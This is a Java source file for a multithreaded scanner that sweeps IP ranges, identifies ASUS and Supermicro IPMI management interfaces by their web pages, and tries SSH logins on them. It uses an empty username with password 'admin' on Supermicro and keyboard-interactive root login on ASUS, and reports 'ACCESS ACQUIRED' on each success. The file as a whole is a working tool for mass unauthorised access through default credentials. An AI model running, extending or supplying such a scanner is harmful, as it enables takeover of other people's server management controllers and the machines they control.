package ipmifinder;

import ch.ethz.ssh2.Connection;
import ch.ethz.ssh2.Session;
import ch.ethz.ssh2.StreamGobbler;
import java.io.*;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketAddress;
import java.net.URL;
import java.util.logging.Level;
import java.util.logging.Logger;
import org.apache.http.HttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.params.BasicHttpParams;
import org.apache.http.params.HttpConnectionParams;
import org.apache.http.params.HttpParams;

/**
 *
 * @author pedrodias petermdias@gmail.com
 * 
 */
public class IPMIFinder extends Thread {

    @Override
    public void run() {
        while (!Main.subnets.isEmpty()) {
            processRange(Main.subnets.poll());
            Main.done.incrementAndGet();
        }

        System.out.println("THREAD" + Thread.currentThread().getId() + " DIED");
    }

    private void processRange(String range) {
        String[] aux = range.split("-");

        String[] auxb = aux[0].split("\\.");
        String[] auxe = aux[1].split("\\.");

        int a = Integer.parseInt(auxb[0]);
        int b = Integer.parseInt(auxb[1]);
        int c = Integer.parseInt(auxb[2]);
        int d = Integer.parseInt(auxb[3]);

        int ae = Integer.parseInt(auxe[0]);
        int be = Integer.parseInt(auxe[1]);
        int ce = Integer.parseInt(auxe[2]);

        System.out.println("THREAD" + Thread.currentThread().getId() + " SCANNING - " + aux[0] + " to " + aux[1]);

        while (true) {
            if (d == 255) {
                d = 1;
                if (c == 255) {
                    c = 0;
                    if (b == 255) {
                        b = 0;
                        a++;
                    } else {
                        b++;
                    }
                } else {
                    c++;
                }
            } else {
                d++;
            }

            String ip = a + "." + b + "." + c + "." + d;

            if (a == ae && b == be && c == ce && (d == 254 || d == 255)) {
                break;
            }

            try {
                String contents = readPage(new URL("http://" + ip + "/"));

                if (isAsus(contents)) {
                    if (verifyAsus(ip)) {
                        System.out.println("THREAD" + Thread.currentThread().getId() + " " + ip + " FOUND ASUS\t - ACCESS ACQUIRED");
                    } else {
                        System.out.println("THREAD" + Thread.currentThread().getId() + " " + ip + " FOUND ASUS\t - ACCESS DENIED (or not ASUS)");
                    }
                } else if (isSupermicro(contents)) {
                    if (verifySupermicro(ip)) {
                        System.out.println("THREAD" + Thread.currentThread().getId() + " " + ip + " FOUND SUPERMICRO\t - ACCESS ACQUIRED");
                    } else {
                        System.out.println("THREAD" + Thread.currentThread().getId() + " " + ip + " FOUND SUPERMICRO\t - ACCESS DENIED");
                    }
                }
            } catch (Exception e) {
            }
        }
    }

    private boolean isSupermicro(String contents) throws IOException {
        if (contents.contains("ATEN International")) {
            return true;
        } else {
            return false;
        }
    }

    private boolean isAsus(String contents) throws IOException {
        if (contents.contains("xmit.js") && contents.contains("login.html")) {
            return true;
        } else {
            return false;
        }
    }

    private boolean verifySupermicro(String url) throws IOException {
        SocketAddress sockaddr = new InetSocketAddress(url, 22);
        Socket socket = new Socket();
        socket.connect(sockaddr, 2000);

        Connection conn = new Connection(url, 22);
        conn.connect();

        boolean isAuthenticated = conn.authenticateWithPassword("", "admin");

        if (isAuthenticated == false) {
            return false;
        } else {
            Session sess = conn.openSession();
            sess.startShell();

            InputStream stdout = new StreamGobbler(sess.getStdout());
            BufferedReader input = new BufferedReader(new InputStreamReader(stdout));
            OutputStream out = sess.getStdin();

            if (input.readLine().contains("fail")) {
                return false;
            } else {
                return true;
            }
        }
    }

    private boolean verifyAsus(String url) throws IOException {
        SocketAddress sockaddr = new InetSocketAddress(url, 22);
        Socket socket = new Socket();
        socket.connect(sockaddr, 2000);
        Connection conn = new Connection(url, 22);
        conn.connect();
        InteractiveLogic il = new InteractiveLogic();

        boolean authed = conn.authenticateWithKeyboardInteractive("root", il);
        return authed;
    }

    private String readPage(URL url) throws Exception {
        Logger.getLogger("org.apache.http.client").setLevel(Level.SEVERE);
        Logger.getLogger("org.apache.http.impl.client").setLevel(Level.SEVERE);

        final HttpParams httpParams = new BasicHttpParams();
        HttpConnectionParams.setConnectionTimeout(httpParams, 2000);
        DefaultHttpClient client = new DefaultHttpClient(httpParams);
        HttpGet request = new HttpGet(url.toURI());
        HttpResponse response = client.execute(request);
        Reader reader = null;

        try {
            reader = new InputStreamReader(response.getEntity().getContent());
            StringBuilder sb = new StringBuilder();
            {
                int read;
                char[] cbuf = new char[1024];
                while ((read = reader.read(cbuf)) != -1) {
                    sb.append(cbuf, 0, read);
                }
            }
            return sb.toString();
        } finally {
            if (reader != null) {
                try {
                    reader.close();
                } catch (IOException e) {
                }
            }
        }
    }
}
